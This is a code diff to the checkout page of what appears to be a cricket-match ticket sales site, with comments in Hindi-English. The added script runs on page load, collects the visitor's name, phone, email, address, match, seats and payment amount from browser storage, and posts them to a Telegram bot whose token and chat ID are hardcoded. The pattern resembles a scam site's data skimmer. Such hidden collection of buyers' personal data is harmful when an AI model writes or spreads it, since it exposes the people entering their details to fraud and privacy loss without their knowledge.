@@ -260,12 +260,41 @@
         document.addEventListener("DOMContentLoaded", () => {
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
-            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
             
-            const message = `🚨 *New User on Payment Page!*\n\n💰 *Amount:* ₹${finalPrice}\n🌐 *Page:* Checkout/Payment`;
+            // 🔥 1. Pichle pages ka data fetch karna 🔥
+            let matchTitle = "Not Selected";
+            let matchDate = "";
+            try {
+                const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
+                if(matchData) {
+                    matchTitle = matchData.title || "Not Selected";
+                    matchDate = matchData.date ? `(${matchData.date})` : "";
+                }
+            } catch(e) {}
+
+            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
+            const name = localStorage.getItem('customerName') || "Not Provided";
+            const phone = localStorage.getItem('customerPhone') || "Not Provided";
+            const email = localStorage.getItem('customerEmail') || "Not Provided";
+            
+            // Address ke alag-alag naam ho sakte hain local storage mein, isliye dono check kiye hain
+            const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
+            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
+            
+            // 🔥 2. Naya Detailed Message Banana 🔥
+            const message = `🚨 *New User on Payment Page!* 🚨\n\n` +
+                            `👤 *Name:* ${name}\n` +
+                            `📞 *Phone:* ${phone}\n` +
+                            `📧 *Email:* ${email}\n` +
+                            `🏠 *Address:* ${address}\n` +
+                            `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
+                            `🎟️ *Seats:* ${seats}\n` +
+                            `💰 *Amount to Pay:* ₹${finalPrice}\n` +
+                            `🌐 *Status:* Thinking to Pay...`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
+            // 🔥 3. Telegram par bhejna 🔥
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -277,7 +306,7 @@
             }).catch(err => console.error("Telegram Error:", err));
         });
     </script>
-
+    
     <script type="module" src="js/payment.js"></script>
 </body>
 </html>
